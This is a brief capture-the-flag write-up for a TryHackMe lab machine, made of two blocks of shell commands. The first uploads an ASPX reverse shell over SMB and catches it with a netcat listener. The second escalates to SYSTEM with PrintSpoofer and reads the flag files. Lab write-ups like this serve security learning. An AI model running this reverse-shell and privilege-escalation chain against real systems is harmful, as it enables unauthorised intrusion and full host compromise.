# Relevant

These notes are from a challenge I did @[tryhackme](https://tryhackme.com) called [relevant](https://tryhackme.com/room/relevant).

## Flag 1

``` sh
git clone https://github.com/borjmz/aspx-reverse-shell
cd aspx-reverse-shell
ifconfig
nano shell.aspx ## add IP from attack machine and port 8888
smbclient \\\\10.10.96.94\\nt4wrksv
put shell.aspx
nc -lvnp 8888
firefox http://10.10.96.94:49663/nt4wrksv/shell.aspx
more c:\users\bob\desktop\user.txt
```

## Flag 2

``` sh
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe ## PrintSpoofer32.exe didnt work
smbclient \\\\10.10.96.94\\nt4wrksv
put PrintSpoofer64.exe
cd C:\inetpub\wwwroot\nt4wrksv
PrintSpoofer64.exe -i -c cmd
more c:\users\administrator\desktop\root.txt
```
